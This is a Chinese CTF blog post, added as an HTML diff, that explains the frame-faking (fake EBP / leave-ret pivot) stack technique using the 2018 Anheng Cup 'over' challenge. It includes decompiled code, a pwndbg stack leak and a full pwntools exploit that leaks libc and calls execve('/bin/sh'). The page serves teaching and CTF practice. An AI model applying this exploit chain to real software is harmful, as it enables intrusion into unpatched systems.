@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"mark0519.github.io","root":"/","scheme":"Pisces","version":"8.0.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+  </script>
+
+  <meta name="description" content="Frame Faking还欠下的技术栈（二） 果然一些以前看不懂的东西等学的东西多一点就慢慢能看明白了QAQ">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn-frame_faking">
+<meta property="og:url" content="https://mark0519.github.io/2021/07/19/pwn-frame-faking/index.html">
+<meta property="og:site_name" content="Mark&#96;s blog">
+<meta property="og:description" content="Frame Faking还欠下的技术栈（二） 果然一些以前看不懂的东西等学的东西多一点就慢慢能看明白了QAQ">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-07-19T04:19:57.000Z">
+<meta property="article:modified_time" content="2021-07-19T12:26:34.908Z">
+<meta property="article:author" content="mark0519">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="python2">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://mark0519.github.io/2021/07/19/pwn-frame-faking/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>pwn-frame_faking | Mark`s blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Mark`s blog</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <section class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Frame-Faking"><span class="nav-number">1.</span> <span class="nav-text">Frame Faking</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.0.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2018-%E5%AE%89%E6%81%92%E6%9D%AF-over"><span class="nav-number">1.0.2.</span> <span class="nav-text">2018 安恒杯 over</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%BF%A1%E6%81%AF"><span class="nav-number">1.0.2.1.</span> <span class="nav-text">文件信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E7%A8%8B%E5%BA%8F"><span class="nav-number">1.0.2.2.</span> <span class="nav-text">分析程序</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#leak-stack"><span class="nav-number">1.0.2.3.</span> <span class="nav-text">leak stack</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exp"><span class="nav-number">1.0.2.4.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></li></ol></li></ol></div>
+        </section>
+        <!--/noindex-->
+
+        <section class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">mark0519</p>
+  <div class="site-description" itemprop="description">大一在读，菜鸡pwn手~</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">48</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/mark0519" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;mark0519" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:sunjiajun@bupt.edu.cn" title="E-Mail → mailto:sunjiajun@bupt.edu.cn" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+        </section>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+      
+
+      
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mark0519.github.io/2021/07/19/pwn-frame-faking/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="mark0519">
+      <meta itemprop="description" content="大一在读，菜鸡pwn手~">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mark`s blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          pwn-frame_faking
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-07-19 12:19:57 / 修改时间：20:26:34" itemprop="dateCreated datePublished" datetime="2021-07-19T12:19:57+08:00">2021-07-19</time>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="Frame-Faking"><a href="#Frame-Faking" class="headerlink" title="Frame Faking"></a>Frame Faking</h1><p>还欠下的技术栈（二）</p>
+<p>果然一些以前看不懂的东西等学的东西多一点就慢慢能看明白了QAQ</p>
+<a id="more"></a>
+
+<p>正如这个技巧名字所说的那样，这个技巧就是构造一个虚假的栈帧来控制程序的执行流。</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>概括地讲，在之前讲的栈溢出不外乎两种方式</p>
+<ul>
+<li>控制程序 EIP</li>
+<li>控制程序 EBP</li>
+</ul>
+<p>其最终都是控制程序的执行流。在 frame faking 中，我们所利用的技巧便是同时控制 EBP 与 EIP，这样我们在控制程序执行流的同时，也改变程序栈帧的位置。一般来说其 payload 如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buffer padding|fake ebp|leave ret addr|</span><br></pre></td></tr></table></figure>
+
+<p>即我们利用栈溢出将栈上构造为如上格式。这里我们主要讲下后面两个部分</p>
+<ul>
+<li>函数的返回地址被我们覆盖为执行 leave ret 的地址，这就表明了函数在正常执行完自己的 leave ret 后，还会再次执行一次 leave ret。</li>
+<li>其中 fake ebp 为我们构造的栈帧的基地址，需要注意的是这里是一个地址。一般来说我们构造的假的栈帧如下</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fake ebp</span><br><span class="line">|</span><br><span class="line">v</span><br><span class="line">ebp2|target function addr|leave ret addr|arg1|arg2</span><br></pre></td></tr></table></figure>
+
+<p>这里我们的 fake ebp 指向 ebp2，即它为 ebp2 所在的地址。通常来说，这里都是我们能够控制的可读的内容。</p>
+<p><strong>下面的汇编语法是 intel 语法。</strong></p>
+<p>在我们介绍基本的控制过程之前，我们还是有必要说一下，函数的入口点与出口点的基本操作</p>
+<p>入口点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push ebp  # 将ebp压栈</span><br><span class="line">mov ebp, esp #将esp的值赋给ebp</span><br></pre></td></tr></table></figure>
+
+<p>出口点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leave</span><br><span class="line">ret #pop eip，弹出栈顶元素作为程序下一个执行地址</span><br></pre></td></tr></table></figure>
+
+<p>其中 leave 指令相当于</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp, ebp # 将ebp的值赋给esp</span><br><span class="line">pop ebp # 弹出ebp</span><br></pre></td></tr></table></figure>
+
+<p>下面我们来仔细说一下基本的控制过程。</p>
+<ol>
+<li>在有栈溢出的程序执行 leave 时，其分为两个步骤<ul>
+<li>mov esp, ebp ，这会将 esp 也指向当前栈溢出漏洞的 ebp 基地址处。</li>
+<li>pop ebp， 这会将栈中存放的 fake ebp 的值赋给 ebp。即执行完指令之后，ebp 便指向了 ebp2，也就是保存了 ebp2 所在的地址。</li>
+</ul>
+</li>
+<li>执行 ret 指令，会再次执行 leave ret 指令。</li>
+<li>执行 leave 指令，其分为两个步骤<ul>
+<li>mov esp, ebp ，这会将 esp 指向 ebp2。</li>
+<li>pop ebp，此时，会将 ebp 的内容设置为 ebp2 的值，同时 esp 会指向 target function。</li>
+</ul>
+</li>
+<li>执行 ret 指令，这时候程序就会执行 target function，当其进行程序的时候会执行<ul>
+<li>push ebp，会将 ebp2 值压入栈中。</li>
+<li>mov ebp, esp，将 ebp 指向当前基地址。</li>
+</ul>
+</li>
+</ol>
+<p>此时的栈结构如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ebp</span><br><span class="line">|</span><br><span class="line">v</span><br><span class="line">ebp2|leave ret addr|arg1|arg2</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>当程序执行时，其会正常申请空间，同时我们在栈上也安排了该函数对应的参数，所以程序会正常执行。</li>
+<li>程序结束后，其又会执行两次 leave ret addr，所以如果我们在 ebp2 处布置好了对应的内容，那么我们就可以一直控制程序的执行流程。</li>
+</ol>
+<p>可以看出在 fake frame 中，我们有一个需求就是，我们必须得有一块可以写的内存，并且我们还知道这块内存的地址，这一点与 stack pivoting 相似。</p>
+<h3 id="2018-安恒杯-over"><a href="#2018-安恒杯-over" class="headerlink" title="2018 安恒杯 over"></a>2018 安恒杯 over</h3><p>以 2018 年 6 月安恒杯月赛的 over 一题为例进行介绍</p>
+<h4 id="文件信息"><a href="#文件信息" class="headerlink" title="文件信息"></a>文件信息</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">over.over: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=99beb778a74c68e4ce1477b559391e860dd0e946, stripped</span><br><span class="line">[*] &#x27;/home/m4x/pwn_repo/others_over/over.over&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE</span><br></pre></td></tr></table></figure>
+
+<p>64 位动态链接的程序, 没有开 PIE 和 canary 保护, 但开了 NX 保护</p>
+<h4 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h4><p>放到 IDA 中进行分析</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">while</span> ( sub_400676() )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_400676</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">80</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">&#x27;&gt;&#x27;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">96u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>漏洞很明显, read 能读入 96 位, 但 buf 的长度只有 80, 因此能覆盖 rbp 以及 ret addr 但也只能覆盖到 rbp 和 ret addr, 因此也只能通过同时控制 rbp 以及 ret addr 来进行 rop 了</p>
+<h4 id="leak-stack"><a href="#leak-stack" class="headerlink" title="leak stack"></a>leak stack</h4><p>为了控制 rbp, 我们需要知道某些地址, 可以发现当输入的长度为 80 时, 由于 read 并不会给输入末尾补上 ‘\0’, rbp 的值就会被 puts 打印出来, 这样我们就可以通过固定偏移知道栈上所有位置的地址了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 1, 0x00000000004006b9 in ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">───────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────</span><br><span class="line"> RAX  0x7ffceaf11160 ◂— 0x3030303030303030 (&#x27;00000000&#x27;)</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x7ff756e9b690 (__read_nocancel+7) ◂— cmp    rax, -0xfff</span><br><span class="line"> RDX  0x60</span><br><span class="line"> RDI  0x7ffceaf11160 ◂— 0x3030303030303030 (&#x27;00000000&#x27;)</span><br><span class="line"> RSI  0x7ffceaf11160 ◂— 0x3030303030303030 (&#x27;00000000&#x27;)</span><br><span class="line"> R8   0x7ff75715b760 (_IO_stdfile_1_lock) ◂— 0x0</span><br><span class="line"> R9   0x7ff757354700 ◂— 0x7ff757354700</span><br><span class="line"> R10  0x37b</span><br><span class="line"> R11  0x246</span><br><span class="line"> R12  0x400580 ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7ffceaf112b0 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x7ffceaf111b0 —▸ 0x7ffceaf111d0 —▸ 0x400730 ◂— push   r15</span><br><span class="line"> RSP  0x7ffceaf11160 ◂— 0x3030303030303030 (&#x27;00000000&#x27;)</span><br><span class="line"> RIP  0x4006b9 ◂— call   0x400530</span><br><span class="line">─────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x4006b9    call   puts@plt &lt;0x400530&gt;</span><br><span class="line">        s: 0x7ffceaf11160 ◂— 0x3030303030303030 (&#x27;00000000&#x27;)</span><br><span class="line"></span><br><span class="line">   0x4006be    leave</span><br><span class="line">   0x4006bf    ret</span><br><span class="line"></span><br><span class="line">   0x4006c0    push   rbp</span><br><span class="line">   0x4006c1    mov    rbp, rsp</span><br><span class="line">   0x4006c4    sub    rsp, 0x10</span><br><span class="line">   0x4006c8    mov    dword ptr [rbp - 4], edi</span><br><span class="line">   0x4006cb    mov    qword ptr [rbp - 0x10], rsi</span><br><span class="line">   0x4006cf    mov    rax, qword ptr [rip + 0x20098a] &lt;0x601060&gt;</span><br><span class="line">   0x4006d6    mov    ecx, 0</span><br><span class="line">   0x4006db    mov    edx, 2</span><br><span class="line">─────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rax rdi rsi rsp  0x7ffceaf11160 ◂— 0x3030303030303030 (&#x27;00000000&#x27;)</span><br><span class="line">... ↓</span><br><span class="line">───────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0           4006b9</span><br><span class="line">   f 1           400715</span><br><span class="line">   f 2     7ff756de02b1 __libc_start_main+241</span><br><span class="line">Breakpoint *0x4006B9</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> stack 15</span></span><br><span class="line">00:0000│ rax rdi rsi rsp  0x7ffceaf11160 ◂— 0x3030303030303030 (&#x27;00000000&#x27;)</span><br><span class="line">... ↓</span><br><span class="line">0a:0050│ rbp              0x7ffceaf111b0 —▸ 0x7ffceaf111d0 —▸ 0x400730 ◂— push   r15</span><br><span class="line">0b:0058│                  0x7ffceaf111b8 —▸ 0x400715 ◂— test   eax, eax</span><br><span class="line">0c:0060│                  0x7ffceaf111c0 —▸ 0x7ffceaf112b8 —▸ 0x7ffceaf133db ◂— &#x27;./over.over&#x27;</span><br><span class="line">0d:0068│                  0x7ffceaf111c8 ◂— 0x100000000</span><br><span class="line">0e:0070│                  0x7ffceaf111d0 —▸ 0x400730 ◂— push   r15</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> distance 0x7ffceaf111d0 0x7ffceaf11160</span></span><br><span class="line"><span class="meta">0x7ffceaf111d0-&gt;</span><span class="bash">0x7ffceaf11160 is -0x70 bytes (-0xe words)</span></span><br></pre></td></tr></table></figure>
+
+<p>leak 出栈地址后, 我们就可以通过控制 rbp 为栈上的地址 (如 0x7ffceaf11160), ret addr 为 leave ret 的地址来实现控制程序流程了。</p>
+<p>比如我们可以在 0x7ffceaf11160 + 0x8 填上 leak libc 的 rop chain 并控制其返回到 <code>sub_400676</code> 函数来 leak libc。<br>然后在下一次利用时就可以通过 rop 执行 <code>system(&quot;/bin/sh&quot;)</code> 或 <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> 来 get shell 了, 这道题目因为输入的长度足够, 我们可以布置调用 <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> 的利用链, 这种方法更稳妥 (<code>system(&quot;/bin/sh&quot;)</code> 可能会因为 env 被破坏而失效), 不过由于利用过程中栈的结构会发生变化, 所以一些关键的偏移还需要通过调试来确定</p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary = <span class="string">&quot;./over.over&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DEBUG</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    raw_input(<span class="string">&quot;DEBUG: &quot;</span>)</span><br><span class="line">    gdb.attach(io, cmd)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./over.over&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./over.over&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">80</span>)</span><br><span class="line">stack = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[<span class="number">-6</span>: ].ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>)) - <span class="number">0x70</span></span><br><span class="line">success(<span class="string">&quot;stack -&gt; &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(stack))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#  DEBUG(&quot;b *0x4006B9\nc&quot;)</span></span><br><span class="line">io.sendafter(<span class="string">&quot;&gt;&quot;</span>, flat([<span class="string">&#x27;11111111&#x27;</span>, <span class="number">0x400793</span>, elf.got[<span class="string">&#x27;puts&#x27;</span>], elf.plt[<span class="string">&#x27;puts&#x27;</span>], <span class="number">0x400676</span>, (<span class="number">80</span> - <span class="number">40</span>) * <span class="string">&#x27;1&#x27;</span>, stack, <span class="number">0x4006be</span>]))</span><br><span class="line">libc.address = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[<span class="number">-6</span>: ].ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc.address -&gt; &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(libc.address))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x400793</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &quot;pop|ret&quot;</span></span><br><span class="line"><span class="string">0x00000000000f5279 : pop rdx ; pop rsi ; ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pop_rdx_pop_rsi_ret=libc.address+<span class="number">0xf5279</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=flat([<span class="string">&#x27;22222222&#x27;</span>, pop_rdi_ret, <span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh&quot;</span>)),pop_rdx_pop_rsi_ret,p64(<span class="number">0</span>),p64(<span class="number">0</span>), libc.sym[<span class="string">&#x27;execve&#x27;</span>], (<span class="number">80</span> - <span class="number">7</span>*<span class="number">8</span> ) * <span class="string">&#x27;2&#x27;</span>, stack - <span class="number">0x30</span>, <span class="number">0x4006be</span>])</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;&gt;&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>总的来说这种方法跟 stack pivot 差别并不是很大。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>mark0519
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://mark0519.github.io/2021/07/19/pwn-frame-faking/" title="pwn-frame_faking">https://mark0519.github.io/2021/07/19/pwn-frame-faking/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/python2/" rel="tag"># python2</a>
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
